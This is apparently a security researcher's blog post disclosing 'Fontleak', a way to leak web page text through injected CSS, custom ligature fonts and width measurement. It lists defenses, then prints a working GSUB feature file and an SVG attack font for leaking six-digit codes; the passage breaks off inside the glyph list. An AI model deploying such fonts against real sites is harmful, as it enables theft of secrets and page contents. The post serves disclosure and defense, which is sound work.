---
date: '2026-03-26'
description: The Fontleak technique developed by Dragos Albastroiu utilizes CSS and
  custom fonts to exfiltrate data from web pages, exploiting vulnerabilities in modern
  browsers (Chrome, Firefox, Safari). It leverages the CSS `@container` rule for width
  measurement via custom ligatures, allowing attackers to systematically leak text
  from HTML elements, including sensitive inline scripts. Protective measures include
  enforcing strict Content Security Policies (CSP) and configuring DOMPurify to forbid
  `<style>` tags. This method enhances traditional CSS-based exfiltration techniques
  and poses significant risks to web applications with inadequate defenses against
  CSS injection.
link: https://adragos.ro/fontleak/
tags:
- CSS Injection
- Content Security Policy
- Web Security
- Cybersecurity Research
- Data Exfiltration
title: 'Fontleak: exfiltrating text using CSS and Ligatures'
---

# Dragos Albastroiu

Security researcher, CTF player with team [WreckTheLine](https://wrecktheline.com/)

# [Introduction](https://adragos.ro/fontleak/\#introduction)

Fontleak is a new technique for **quickly** exfiltrating text from web pages using only CSS and a carefully crafted font. The threat model is any attacker that can inject arbitrary CSS into a web page. From there they can choose to leak contents of paragraphs and even secrets from inline scripts.

This works on the latest versions of Chrome, Firefox, and Safari\* and bypasses DOMPurify since `<style>` tags are allowed by default.

To protect your application (as a developer):

- Use a strong Content Security Policy (CSP): do not allow outside stylesheets, data: fonts, inline styles or outside images.
- Add `FORBID_TAGS: ['style']` to your DOMPurify config.
- Sandbox reflected user input in an iframe

# [Background](https://adragos.ro/fontleak/\#background)

You might've stumbled on [Llama.ttf](https://fuglede.github.io/llama.ttf/) recently, it packed an entire small language model right into a font file. Seeing that got me curious about fonts in general and what else you could do with them, especially in a browser context.

Initially, I wanted to see if Llama.ttf could actually work directly in my web browser, but was disappointed when it didn't. The HarfBuzz WebAssembly shaper it needed wasn't available in the browsers I normally use. So instead, I started looking around for other font experiments and found [Fontemon](https://www.coderelay.io/fontemon.html). It was a bit different, but it ran everywhere I tested it. No matter how much text I typed, Fontemon always showed just a single image, fixed in size.

I then downloaded Fontemon and setup a simple HTML file to mess around locally. That's when I realized that adding characters with CSS pseudo-elements (`::before` and `::after`) actually affected the state of the game. That gave me the idea that combining CSS + fonts could do more than just display graphics.

I knew DOMPurify allows `<style>` tags by default, and plenty of web apps store sensitive data in inline `<script>` tags. Combining these ideas made me think: could I build a custom font designed specifically to leak the content of these scripts? And text nodes in general.

Looking around for existing CSS-based data leaks (I already knew about techniques like [SIC](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)), I found a blog post from nearly a decade ago called " [Stealing Data in Great Style](https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/)." Their method was cool but relied on [XS-Leaks](https://xsleaks.dev/), it needed a window that was controlled by the attacker and iframes. Not great since cookies are no longer transmitted over iframes cross-site. Other sources that I've found after developing fontleak are [Episode 79: The State of CSS Injection - Leaking Text Nodes & HTML Attributes by **Critical Thinking - Bug Bounty Podcast**](https://blog.criticalthinkingpodcast.io/p/css-injection-leaking-text-nodes-html-attributes), [CSS Injection: Attacking with Just CSS (Part 2)](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/) and [Data Exfiltration via CSS + SVG Font](https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html).

Considering how powerful CSS has become lately (you can even make entire games with it, like [Cascade of Duty](https://garethheyes.co.uk/games/cascade-of-duty/)), I figured there had to be an easier and faster way to leak data using fonts and CSS alone.

# [Ligatures](https://adragos.ro/fontleak/\#ligatures)

You've probably seen ligatures before, especially if you use code fonts. They're special rules that are used to combine multiple symbols into one. For example, some fonts automatically turn the characters `>=` into a single fancy glyph `≥`.

Font ligatures are typically implemented using one of three main systems: OpenType GSUB, Graphite, and Apple Advanced Typography (AAT). OpenType GSUB works across all modern browsers, Graphite is available primarily in Firefox, and AAT works mainly in Safari. For my research, I decided to focus on GSUB since it's the most widely supported, even though it's the _least_ powerful.

GSUB works by defining substitutions: you basically tell the font, "if you see this set of characters, replace it with that glyph." To exploit this, I took [Michał's](https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/) idea of a zero-width font and combined it with GSUB substitutions. Here's how it works: Let's say `@any` represents any ASCII character from 0-255 (well, technically only characters we care about that we define in our alphabet, we can have u0 as the glyph for any other character). I defined a substitution rule that works by substituting `i₀ @anyᵢ` with `@leakᵢ` would substitute the symbols with a special symbol that has a specific width of the character at index 0. From there, leaking the nth character just involves chaining more substitutions, like replacing `iₙ @any` with `iₙ₋₁`.

With this method, given a specific prefix like `in`, we can measure only the width of the character at position `n`. Here is how the Feature File Syntax of a font that leaks 6 digit codes looks like:

```
@any = [u0 c0 c1 c2 c3 c4 c5 c6 c7 c8 c9];
@leaks = [lu l0 l1 l2 l3 l4 l5 l6 l7 l8 l9];
feature liga {
  sub u0 by NULL; // "remove" characters that are not digits
  lookup handle_index_5 {
    sub i6 @any by i5;
  } handle_index_5;
  lookup handle_index_4 {
    sub i5 @any by i4;
  } handle_index_4;
  lookup handle_index_3 {
    sub i4 @any by i3;
  } handle_index_3;
  lookup handle_index_2 {
    sub i3 @any by i2;
  } handle_index_2;
  lookup handle_index_1 {
    sub i2 @any by i1;
  } handle_index_1;
  lookup handle_index_0 {
    sub i1 @any by i0;
  } handle_index_0;
  lookup final_substitution {
    sub i0 u0 by lu;
    sub i0 c0 by l0;
    sub i0 c1 by l1;
    sub i0 c2 by l2;
    sub i0 c3 by l3;
    sub i0 c4 by l4;
    sub i0 c5 by l5;
    sub i0 c6 by l6;
    sub i0 c7 by l7;
    sub i0 c8 by l8;
    sub i0 c9 by l9;
  } final_substitution;
} liga;
```

And the accompanying SVG font:

```svg
<svg>
  <defs>
    <font id="fontleak" horiz-adv-x="0">
      <font-face font-family="fontleak" units-per-em="1000" ascent="5" descent="5" />
      <missing-glyph />
      <glyph glyph-name="u0" unicode="&#x0000;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0001;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0002;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0003;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0004;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0005;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0006;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0007;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0008;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0009;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x000A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x000B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x000C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x000D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x000E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x000F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0010;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0011;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0012;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0013;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0014;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0015;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0016;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0017;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0018;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0019;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x001A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x001B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x001C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x001D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x001E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x001F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0020;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0021;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0022;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0023;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0024;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0025;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0026;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0027;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0028;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0029;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x002A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x002B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x002C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x002D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x002E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x002F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="c0" unicode="&#x0030;" horiz-adv-x="0" d="M48 0z"/>
      <glyph glyph-name="c1" unicode="&#x0031;" horiz-adv-x="0" d="M49 0z"/>
      <glyph glyph-name="c2" unicode="&#x0032;" horiz-adv-x="0" d="M50 0z"/>
      <glyph glyph-name="c3" unicode="&#x0033;" horiz-adv-x="0" d="M51 0z"/>
      <glyph glyph-name="c4" unicode="&#x0034;" horiz-adv-x="0" d="M52 0z"/>
      <glyph glyph-name="c5" unicode="&#x0035;" horiz-adv-x="0" d="M53 0z"/>
      <glyph glyph-name="c6" unicode="&#x0036;" horiz-adv-x="0" d="M54 0z"/>
      <glyph glyph-name="c7" unicode="&#x0037;" horiz-adv-x="0" d="M55 0z"/>
      <glyph glyph-name="c8" unicode="&#x0038;" horiz-adv-x="0" d="M56 0z"/>
      <glyph glyph-name="c9" unicode="&#x0039;" horiz-adv-x="0" d="M57 0z"/>
      <glyph glyph-name="u0" unicode="&#x003A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x003B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x003C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x003D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x003E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x003F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0040;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0041;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0042;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0043;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0044;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0045;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0046;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0047;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0048;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0049;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x004A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x004B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x004C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x004D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x004E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x004F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0050;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0051;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0052;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0053;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0054;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0055;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0056;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0057;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0058;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0059;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x005A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x005B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x005C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x005D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x005E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x005F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0060;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0061;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0062;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0063;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0064;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0065;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0066;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0067;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0068;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0069;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x006A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x006B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x006C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x006D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x006E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x006F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0070;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0071;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0072;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0073;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0074;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0075;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0076;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0077;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0078;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0079;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x007A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x007B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x007C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x007D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x007E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x007F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0080;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0081;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0082;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0083;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0084;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0085;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0086;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0087;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0088;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0089;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x008A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x008B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x008C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x008D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x008E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x008F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0090;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0091;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0092;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0093;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0094;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0095;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0096;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0097;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0098;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x0099;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x009A;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x009B;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x009C;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x009D;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x009E;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x009F;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A0;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A1;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A2;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A3;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A4;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A5;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A6;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A7;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A8;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00A9;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00AA;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00AB;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00AC;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00AD;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00AE;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00AF;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B0;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B1;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B2;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B3;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B4;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B5;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B6;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B7;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B8;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00B9;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00BA;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00BB;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00BC;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00BD;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00BE;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00BF;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C0;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C1;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C2;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C3;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C4;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C5;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C6;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C7;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C8;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00C9;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00CA;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00CB;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00CC;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00CD;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00CE;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00CF;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D0;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D1;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D2;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D3;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D4;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D5;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D6;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D7;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D8;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00D9;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00DA;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00DB;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00DC;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00DD;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00DE;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00DF;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E0;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E1;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E2;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E3;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E4;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E5;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E6;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E7;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E8;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00E9;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00EA;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00EB;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00EC;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00ED;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00EE;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00EF;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F0;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F1;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F2;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F3;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F4;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F5;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F6;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F7;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F8;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00F9;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00FA;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00FB;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00FC;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00FD;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="u0" unicode="&#x00FE;" horiz-adv-x="0" d="M1 0z"/>
